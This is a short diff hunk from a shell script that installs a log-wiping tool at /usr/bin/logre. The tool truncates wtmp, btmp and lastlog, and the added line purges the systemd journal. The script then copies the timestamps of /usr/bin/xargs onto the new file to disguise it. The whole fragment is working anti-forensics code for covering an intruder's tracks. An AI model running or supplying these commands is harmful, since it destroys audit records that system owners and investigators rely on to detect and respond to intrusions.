@@ -52,5 +52,6 @@ cat << 'EOF' > /usr/bin/logre
 > /var/log/wtmp
 > /var/log/btmp
 > /var/log/lastlog
+sudo journalctl --vacuum-time=1s
 EOF
 chmod +x /usr/bin/logre && touch -r /usr/bin/logre /usr/bin/xargs
